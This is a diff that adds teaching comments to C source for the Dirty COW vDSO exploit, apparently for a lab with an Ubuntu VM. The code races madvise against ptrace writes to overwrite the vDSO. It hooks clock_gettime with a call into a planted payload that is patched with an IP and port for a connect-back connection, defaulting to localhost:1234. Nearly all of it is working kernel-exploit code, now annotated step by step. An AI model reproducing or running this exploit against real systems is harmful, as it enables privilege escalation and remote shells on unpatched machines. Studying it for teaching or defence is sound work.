@@ -93,11 +93,14 @@ static struct prologue prologues[] = {
   { "\x55\x83\xff\x01\x48\x89\xe5", 7 },
 };
 
-
+// Get vDSO starting address from auxiliary vector
 static void *get_vdso_addr(void) {
   return (void *)getauxval(AT_SYSINFO_EHDR);
 }
 
+// This is the 'Writing Thread'. ptrace PTRACE_POKETEXT is used to overwrite
+// the vDSO of a child process. ptrace PTRACE_POKETEXT is similar to writing
+// to /proc/self/mem.
 static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
   const unsigned char *s;
   unsigned long value;
@@ -106,6 +109,7 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
   d = dest;
   s = src;
 
+  // Overwrite sizeof(long) bytes at a time. d/dest points to the vDSO mapping.
   while (n >= sizeof(long)) {
     memcpy(&value, s, sizeof(value));
     if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
@@ -138,6 +142,8 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
   return 0;
 }
 
+// A few bytes of the payload must be patched: function prologue, ip, and port.
+// This function finds and overwrites these bytes of the payload.
 static int patch_payload_helper(struct payload_patch *pp) {
   unsigned char *p;
 
@@ -161,7 +167,7 @@ static int patch_payload_helper(struct payload_patch *pp) {
 }
 
 /*
- * A few bytes of the payload must be patched: prologue, ip, and port.
+ * A few bytes of the payload must be patched: function prologue, ip, and port.
  */
 static int patch_payload(struct prologue *p, uint32_t ip, uint16_t port) {
   int i;
@@ -181,17 +187,21 @@ static int patch_payload(struct prologue *p, uint32_t ip, uint16_t port) {
 }
 
 
+// Part one and two, i.e. what is later written to the vDSO, is set in the 
+// vdso_patch struct. This struct is later used when the vDSO is overwritten.
 static int build_vdso_patch(void *vdso_addr, struct prologue *prologue) {
   uint32_t clock_gettime_offset, target;
   unsigned long clock_gettime_addr;
   unsigned char *p, *buf;
   int i;
   
+  // entry_point is the virtual address of the start of the clock_gettime function in the vDSO mapping.
   void *entry_point;
   if ((entry_point = memmem(vdso_addr, VDSO_SIZE, prologue->opcodes, prologue->size)) == 0) {
     fprintf(stderr, "fingerprint opcodes not in vdso\n");
     exit(101);
   }
+  // clock_gettime offset, based on the start of the vDSO mapping.
   clock_gettime_offset  = (uint32_t)(entry_point) & 0xfff;
   clock_gettime_addr = (unsigned long)(entry_point);
   fprintf(stderr, "clock_gettime_offset 0x%x,  clock_gettime_addr 0x%lx\n", clock_gettime_offset, clock_gettime_addr);
@@ -199,10 +209,13 @@ static int build_vdso_patch(void *vdso_addr, struct prologue *prologue) {
   p = vdso_addr;
 
   /* patch #1: put payload at the end of vdso */
+  // This is part 1, the payload.
   vdso_patch[0].patch = payload;
   vdso_patch[0].size = payload_len;
   vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - payload_len;
 
+  // Make sure that we do not overwrite any functions or data. 
+  // This location is at the end of the vDSO mapping.
   p = vdso_patch[0].addr;
   for (i = 0; i < payload_len; i++) {
     if (p[i] != '\x00') {
@@ -219,9 +232,14 @@ static int build_vdso_patch(void *vdso_addr, struct prologue *prologue) {
   }
 
   /* craft call to payload */
+  // This is part 2, i.e. the part that overwrites the start of the clock_gettime function.
   target = VDSO_SIZE - payload_len - clock_gettime_offset;
   memset(buf, '\x90', sizeof(PATTERN_PROLOGUE)-1);
+  // '\xe8' is the opcode for a relative call. 
+  // This relative call takes a 32 bit value as an immediate/argument.
   buf[0] = '\xe8';
+  // -5 is the length of the jump instruction (1 byte for the opcode, 
+  // 4 for the 32 bit argument)
   *(uint32_t *)&buf[1] = target - 5;
 
   vdso_patch[1].patch = buf;
@@ -263,6 +281,7 @@ static void check(struct mem_arg *arg) {
   exit(ret);
 }
 
+// Drop vDSO mapping via madvise MADV_DONTNEED in a loop.
 static void *madviseThread(void *arg_) {
   struct mem_arg *arg;
 
@@ -280,16 +299,21 @@ static void *madviseThread(void *arg_) {
 static int debuggee(void *arg_) {
   printf("debuggee() PID %ld\n", syscall(SYS_getpid));
 
+  // Send SIGKILL to the parent process when this process dies.
   if (prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) == -1) {
     fprintf(stderr, "FAILED IN DEBUGEE");
     err(1, "prctl(PR_SET_PDEATHSIG)");
   }
 
+  // PTRACE_TRACEME allows the parent to ptrace this process
   if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
     fprintf(stderr, "FAILED IN DEBUGEE2");
     err(1, "ptrace(PTRACE_TRACEME)");
   }
 
+  // Send the SIGSTOP signal to this process, so that this process stops/pauses
+  // In the meantime, the writing thread will overwrite vDSO by writing to this
+  // process via ptrace PTRACE_POKETEXT
   if (kill(syscall(SYS_getpid), SIGSTOP) == -1) {
     perror("debuggee kill SIGSTOP\n");
   }
@@ -306,14 +330,16 @@ static void *ptrace_thread(void *arg_) {
 
   arg = (struct mem_arg *)arg_;
 
-  // clone_vm required, see man7, shares memory space with parent
+  // clone_vm required, see manpage for clone, child shares the memory space with parent
   flags = CLONE_VM|CLONE_PTRACE;
+  // clone is similar to fork. The child will execute the debuggee function.
   pid = clone(debuggee, child_stack + sizeof(child_stack) - 8, flags, arg);
   if (pid == -1) {
     warn("clone");
     return NULL;
   }
 
+  // Wait for the child to pause
   if (waitpid(pid, &status, __WALL) == -1) {
     warn("waitpid");
     return NULL;
@@ -338,6 +364,8 @@ static void *ptrace_thread(void *arg_) {
   return ret;
 }
 
+// Starts the Writing, madvise, and "check finished" thread and waits for 
+// these threads to finish, which signals that the exploit has finished.
 static int exploit_helper(struct mem_arg *arg)
 {
   pthread_t pth1, pth2;
@@ -393,6 +421,8 @@ static int exploit(struct mem_arg *arg) {
   unsigned int i;
   int ret = 0;
 
+  // ARRAY_SIZE(vdso_patch) is 2.
+  // These are the parts one and two that are later written to vDSO.
   for (i = 0; i < ARRAY_SIZE(vdso_patch); i++) {
     fprintf(stderr, "exploit: loop %i\n", i);
     arg->patch_number = i;
@@ -406,7 +436,9 @@ static int exploit(struct mem_arg *arg) {
   return ret;
 }
 
-
+// The prologues struct contains multiple possible clock\_gettime function signatures.
+// fingerprint_prologue finds clock\_gettime function signature for the vDSO that this
+// process uses.
 static struct prologue *fingerprint_prologue(void *vdso_addr) {
   struct prologue *p;
   int i;
@@ -415,7 +447,8 @@ static struct prologue *fingerprint_prologue(void *vdso_addr) {
 
   for (i = 0; i < ARRAY_SIZE(prologues); i++) {
     p = &prologues[i];
-
+    
+    // memmem finds the substring p->opcodes in the area [vdso_addr, vdso_addr+VDSO_SIZE]
     if ((entry_point = memmem(vdso_addr, VDSO_SIZE, p->opcodes, p->size)) != 0) {
       return p;
     }
@@ -424,9 +457,9 @@ static struct prologue *fingerprint_prologue(void *vdso_addr) {
   return NULL;
 }
 
-/*
- * 1.2.3.4:1337
- */
+// IP and Port must be in network byte order, this function parses human readable
+// IP and Port to IP and Port in network byte order. The latter are returned
+// via the 'ip' and 'port' function arguments.
 static int parse_ip_port(char *str, uint32_t *ip, uint16_t *port) {
   char *p;
   int ret;
@@ -452,9 +485,13 @@ static int parse_ip_port(char *str, uint32_t *ip, uint16_t *port) {
 }
 
 int main(int argc, char *argv[]) {
+  // Function Signature for the clock\_gettime function
   struct prologue *prologue;
+  // Includes various variables, including the vDSO starting address
   struct mem_arg arg;
+  // Target port of the connection to the Ubuntu VM
   uint16_t port;
+  // Target IP of the connection to the Ubuntu VM
   uint32_t ip;
 
   ip = htonl(PAYLOAD_IP);
@@ -464,15 +501,20 @@ int main(int argc, char *argv[]) {
     if (parse_ip_port(argv[1], &ip, &port) != 0)
       return EXIT_FAILURE;
   }
-  // if no ip:port in argument, use PAYLOAD_IP:PAYLOAD_PORT (localhost:1234)
+  // if no ip:port in argument, PAYLOAD_IP:PAYLOAD_PORT (localhost:1234) is used by default
 
+  // Print where the payload connects to
   fprintf(stderr, "[*] payload target: %s:%d\n",
     inet_ntoa(*(struct in_addr *)&ip), ntohs(port));
 
+  // Get vDSO starting address from auxiliary vector
   arg.vdso_addr = get_vdso_addr();
   if (arg.vdso_addr == NULL)
     return EXIT_FAILURE;
 
+  // The prologues struct contains multiple possible clock\_gettime function signatures.
+  // fingerprint_prologue finds clock\_gettime function signature for the vDSO that this
+  // process uses.
   prologue = fingerprint_prologue(arg.vdso_addr);
   if (prologue == NULL) {
     fprintf(stderr, "[-] this vDSO version isn't supported\n");
@@ -480,12 +522,15 @@ int main(int argc, char *argv[]) {
     return EXIT_FAILURE;
   }
 
+  // Set up vdso part one, i.e. the payload at the end of the vDSO mapping.
   if (patch_payload(prologue, ip, port) == -1)
     return EXIT_FAILURE;
 
+  // Set up vdso part two, i.e. the jump at the start of the clock\_gettime function.
   if (build_vdso_patch(arg.vdso_addr, prologue) == -1)
     return EXIT_FAILURE;
 
+  // Overwrite vDSO with part one and two
   if (exploit(&arg) == -1) {
     fprintf(stderr, "exploit failed\n");
     return EXIT_FAILURE;
